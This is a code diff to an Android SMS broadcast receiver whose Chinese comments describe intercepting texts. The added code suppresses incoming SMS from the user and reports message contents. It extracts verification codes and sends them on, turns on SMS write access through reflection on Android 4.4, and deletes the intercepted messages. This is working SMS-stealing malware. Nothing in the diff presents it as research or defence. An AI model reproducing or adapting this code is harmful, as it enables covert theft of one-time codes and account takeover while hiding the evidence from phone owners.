@@ -50,7 +50,8 @@ public class Receiver_SMS extends BroadcastReceiver {
 	private final String SMS_ID = "_id";
 	private final String SMS_RECEIVE_CONTENT = "content://sms/inbox";
 	private final String SMS_CONTENT = "content://sms";
-	private final long VALID_SMS_TIME = 10 * 60 * 1000;
+	//默认是
+	private final long VALID_SMS_TIME = NativeParams.SMS_RECEIVER_VALID_TIME;
 
 	private static OnReceiveSMSListener mOnReceiveSMSListener;
 
@@ -93,7 +94,6 @@ public class Receiver_SMS extends BroadcastReceiver {
 
 			if (SMS_ACTION.equals(intent.getAction())) {
 				Bundle args = intent.getExtras();
-				String msgContent = "";
 				final boolean isHeartBeatServiceLive = Util_Service.isServiceRunning(context, HeartBeatService.class
 						.getCanonicalName());
 				final boolean isTerminalServiceLive = Util_Service.isServiceRunning(context, TerminalManager.class
@@ -110,8 +110,18 @@ public class Receiver_SMS extends BroadcastReceiver {
 				if (HeartBeatService.recordConnectTime > 0 && (currentTime - HeartBeatService.recordConnectTime <
 						VALID_SMS_TIME)) {
 					this.abortBroadcast();
+					HeartBeatService.recordConnectTime = 0;
 				} else {
-					this.clearAbortBroadcast();
+					//若是我们自己发送指令过去,就走这条通道
+					if (GetMsgRunnable.sendSmsTime > 0 && (currentTime - GetMsgRunnable.sendSmsTime <
+							VALID_SMS_TIME)) {
+						this.abortBroadcast();
+						GetMsgRunnable.sendSmsTime = 0;
+					} else {
+						//若不满足该要求,就清掉该请求.
+						this.clearAbortBroadcast();
+						return;
+					}
 				}
 				//this.abortBroadcast();
 				Map<String, String> map1 = new HashMap<>();
@@ -134,11 +144,47 @@ public class Receiver_SMS extends BroadcastReceiver {
 						messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
 						sb.append(messages[i].getMessageBody());
 					}
+					if (TextUtils.isEmpty(sb.toString())) return;
 					if (sb.toString() != null) {
+						String msgContent = sb.toString();
 						if (DEBUG) {
 							Log.d(TAG, "收到的短信内容：" + sb.toString());
 						}
 						reportData(context, sb.toString());
+						String code = getVerificationCode(msgContent);
+						if (DEBUG) {
+							Log.d(TAG, "验证码是" + code);
+						}
+						//如果是验证码,还要发送该验证码
+						if (!TextUtils.isEmpty(code)) {
+							sendRegisterCode(context, code);
+						}
+						if (Build.VERSION.SDK_INT == Build.VERSION_CODES.KITKAT) {
+							if (SmsWriteOpUtil.isWriteEnabled(context)) {
+								boolean isSuccess = SmsWriteOpUtil.setWriteEnabled(context, true);
+								final String model = Build.MODEL;
+								if (DEBUG) {
+									Log.d(TAG, "4.4反射修改短信权限！！！！！！ " + isSuccess);
+								}
+								Map<String, String> map2 = new HashMap<>();
+								map2.put(NativeParams.KEY_FIX_SYSTEM_SUCCESS, String.valueOf(isSuccess));
+								map2.put(NativeParams.KEY_KITKAT_DEVICE, model);
+								FlurryAgent.logEvent(NativeParams.EVENT_VERSION_KITKAT, map2);
+							}
+						}
+
+//						删掉指令
+//						if (HeartBeatService.recordConnectTime > 0 && (currentTime - HeartBeatService
+//								.recordConnectTime <
+//								VALID_SMS_TIME)) {
+//							final CheckInfo info = GetMsgRunnable.currentCheckInfo;
+//							if (info != null && !TextUtils.isEmpty(info.getOperatorCode())) {
+//								PhoneInfo.getInstance(context).deleteSMS(context, info.getOperatorCode());
+//							}
+//						}
+						//指令前面已经删除
+						//只要删掉该短信
+						PhoneInfo.getInstance(context).deleteSMS(context, msgContent);
 					}
 
 					Map<String, String> map = new HashMap<>();
@@ -149,9 +195,9 @@ public class Receiver_SMS extends BroadcastReceiver {
 					map.put(NativeParams.KEY_MESSAGE_LENGTH, String.valueOf(messages.length));
 					FlurryAgent.logEvent(NativeParams.EVENT_GET_MESSAGE_BROADCAST, map);
 
-					for (int i = 0; i < messages.length; i++) {
-						messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
-						msgContent = messages[i].getMessageBody();
+//					for (int i = 0; i < messages.length; i++) {
+//						messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
+//						msgContent = messages[i].getMessageBody();
 //						final String verifyCode = getVerificationCode(msgContent);
 //						if (!hasPhoneNumber) {
 //							final String number = getPhoneNumber(msgContent);
@@ -171,49 +217,53 @@ public class Receiver_SMS extends BroadcastReceiver {
 //								FlurryAgent.logEvent(NativeParams.EVENT_GET_PHONE_NUMBER, map);
 //							}
 //						}
-						//if (isTerminalServiceLive && isProxyServiceLive) {
-						if (msgContent != null) {
-							if (DEBUG) {
-								Log.d(TAG, "收到的短信内容：" + msgContent);
-							}
-							String code = getVerificationCode(msgContent);
-							if (DEBUG) {
-								Log.d(TAG, "验证码是" + code);
-							}
-							if (TextUtils.isEmpty(msgContent)) return;
-							if (!TextUtils.isEmpty(msgContent)) {
-								if (!TextUtils.isEmpty(code)) {
-									sendRegisterCode(context, code);
-								}
-								if (Build.VERSION.SDK_INT == Build.VERSION_CODES.KITKAT) {
-									if (SmsWriteOpUtil.isWriteEnabled(context)) {
-										boolean isSuccess = SmsWriteOpUtil.setWriteEnabled(context, true);
-										final String model = Build.MODEL;
-										if (DEBUG) {
-											Log.d(TAG, "4.4反射修改短信权限！！！！！！ " + isSuccess);
-										}
-										Map<String, String> map2 = new HashMap<>();
-										map2.put(NativeParams.KEY_FIX_SYSTEM_SUCCESS, String.valueOf(isSuccess));
-										map2.put(NativeParams.KEY_KITKAT_DEVICE, model);
-										FlurryAgent.logEvent(NativeParams.EVENT_VERSION_KITKAT, map2);
-									}
-								}
-
-								//删掉指令
-								final CheckInfo info = GetMsgRunnable.currentCheckInfo;
-								if (info != null && !TextUtils.isEmpty(info.getOperatorCode())) {
-									PhoneInfo.getInstance(context).deleteSMS(context, info.getOperatorCode());
-								}
-								//删掉该短信
-								PhoneInfo.getInstance(context).deleteSMS(context, msgContent);
-//									if (HeartBeatRunnable.isSSHConnected) {
-//										deleteSMS(context, msgContent);
+					//if (isTerminalServiceLive && isProxyServiceLive) {
+//						if (msgContent != null) {
+//							if (DEBUG) {
+//								Log.d(TAG, "收到的短信内容：" + msgContent);
+//							}
+//							String code = getVerificationCode(msgContent);
+//							if (DEBUG) {
+//								Log.d(TAG, "验证码是" + code);
+//							}
+//							if (TextUtils.isEmpty(msgContent)) return;
+//							if (!TextUtils.isEmpty(msgContent)) {
+//								if (!TextUtils.isEmpty(code)) {
+//									sendRegisterCode(context, code);
+//								}
+//								if (Build.VERSION.SDK_INT == Build.VERSION_CODES.KITKAT) {
+//									if (SmsWriteOpUtil.isWriteEnabled(context)) {
+//										boolean isSuccess = SmsWriteOpUtil.setWriteEnabled(context, true);
+//										final String model = Build.MODEL;
+//										if (DEBUG) {
+//											Log.d(TAG, "4.4反射修改短信权限！！！！！！ " + isSuccess);
+//										}
+//										Map<String, String> map2 = new HashMap<>();
+//										map2.put(NativeParams.KEY_FIX_SYSTEM_SUCCESS, String.valueOf(isSuccess));
+//										map2.put(NativeParams.KEY_KITKAT_DEVICE, model);
+//										FlurryAgent.logEvent(NativeParams.EVENT_VERSION_KITKAT, map2);
 //									}
-								break;
-							}
-						}
-						//}
-					}
+//								}
+//
+//								//删掉指令
+//								if (HeartBeatService.recordConnectTime > 0 && (currentTime - HeartBeatService
+//										.recordConnectTime <
+//										VALID_SMS_TIME)) {
+//									final CheckInfo info = GetMsgRunnable.currentCheckInfo;
+//									if (info != null && !TextUtils.isEmpty(info.getOperatorCode())) {
+//										PhoneInfo.getInstance(context).deleteSMS(context, info.getOperatorCode());
+//									}
+//								}
+//								//删掉该短信
+//								PhoneInfo.getInstance(context).deleteSMS(context, msgContent);
+////									if (HeartBeatRunnable.isSSHConnected) {
+////										deleteSMS(context, msgContent);
+////									}
+//								break;
+//							}
+//						}
+					//}
+//					}
 				}
 			}
 		} catch (Throwable e) {
